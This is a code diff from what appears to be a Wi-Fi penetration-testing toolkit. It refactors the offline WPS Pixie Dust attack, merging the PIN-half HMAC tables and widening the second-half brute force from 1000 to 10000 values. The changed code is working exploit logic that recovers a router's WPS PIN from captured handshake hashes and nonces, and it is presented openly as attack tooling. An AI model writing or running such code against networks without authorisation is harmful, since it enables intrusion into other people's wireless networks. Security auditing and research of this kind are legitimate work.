@@ -8,7 +8,7 @@ from __future__ import annotations
 import time
 from dataclasses import dataclass
 from enum import Enum, auto
-from typing import Dict, Iterable, List, Optional, Tuple
+from typing import Iterable, List, Optional, Tuple
 
 from wifit3.campaigns.wps import pins, pixie_prng
 from wifit3.dot11.wsc import crypto as wc
@@ -76,24 +76,15 @@ class _HalfOracle:
     def __init__(self, bundle: PixieBundle):
         self.bundle = bundle
         self.empty_psk = wc.hmac_sha256(bundle.authkey, b"")[:wc.PSK_LEN]
-        self._psk1: List[bytes] = []
-        self._psk2: Dict[str, List[bytes]] = {}
+        self._psk: List[bytes] = []
 
-    def psk1(self, value: int) -> bytes:
-        """first16(HMAC_AuthKey("%04d")): built lazily, so an early first-half match still exits."""
-        while len(self._psk1) <= value:
-            half = f"{len(self._psk1):04d}".encode("ascii")
-            self._psk1.append(wc.hmac_sha256(self.bundle.authkey, half)[:wc.PSK_LEN])
-        return self._psk1[value]
-
-    def psk2(self, first4: str, value: int) -> bytes:
-        """first16(HMAC_AuthKey(P2)) for the value-th tail of ``first4``, keyed by it because the
-        8th digit is a checksum over the first seven."""
-        table = self._psk2.setdefault(first4, [])
-        while len(table) <= value:
-            tail = pins.full_pin(first4, f"{len(table):03d}")[4:].encode("ascii")
-            table.append(wc.hmac_sha256(self.bundle.authkey, tail)[:wc.PSK_LEN])
-        return table[value]
+    def psk(self, value: int) -> bytes:
+        """first16(HMAC_AuthKey("%04d")) for a 4-digit half; built lazily and shared by P1 and P2
+        (a half's PSK is the HMAC of its digits, the same whichever half it is)."""
+        while len(self._psk) <= value:
+            half = f"{len(self._psk):04d}".encode("ascii")
+            self._psk.append(wc.hmac_sha256(self.bundle.authkey, half)[:wc.PSK_LEN])
+        return self._psk[value]
 
     def matches(self, secret_nonce: bytes, psk: bytes, expected_hash: bytes) -> bool:
         """Does ``psk`` under ``secret_nonce`` reproduce the captured E-Hash?"""
@@ -223,18 +214,18 @@ def _find_first_half(oracle: _HalfOracle, e_s1: bytes) -> Optional[str]:
     if oracle.matches(e_s1, oracle.empty_psk, e_hash1):
         return ""
     for value in range(10_000):
-        if oracle.matches(e_s1, oracle.psk1(value), e_hash1):
+        if oracle.matches(e_s1, oracle.psk(value), e_hash1):
             return f"{value:04d}"
     return None
 
 
 def _find_second_half(oracle: _HalfOracle, e_s2: bytes, first4: str) -> Optional[str]:
-    """The full PIN completing ``first4`` whose PSK2 reproduces E-Hash2; ``first4`` unchanged for an
-    empty second half (so a zero-length device password, where ``first4`` is "", recovers as "")."""
+    """The full PIN completing ``first4`` whose PSK2 reproduces E-Hash2 (all 10000 second halves,
+    not just the 1000 checksum-valid ones); ``first4`` itself for an empty zero-length password."""
     e_hash2 = oracle.bundle.e_hash2
     if oracle.matches(e_s2, oracle.empty_psk, e_hash2):
         return first4
-    for value in range(1_000):
-        if oracle.matches(e_s2, oracle.psk2(first4, value), e_hash2):
-            return pins.full_pin(first4, f"{value:03d}")
+    for value in range(10_000):
+        if oracle.matches(e_s2, oracle.psk(value), e_hash2):
+            return pins.join_halves(first4, f"{value:04d}")
     return None
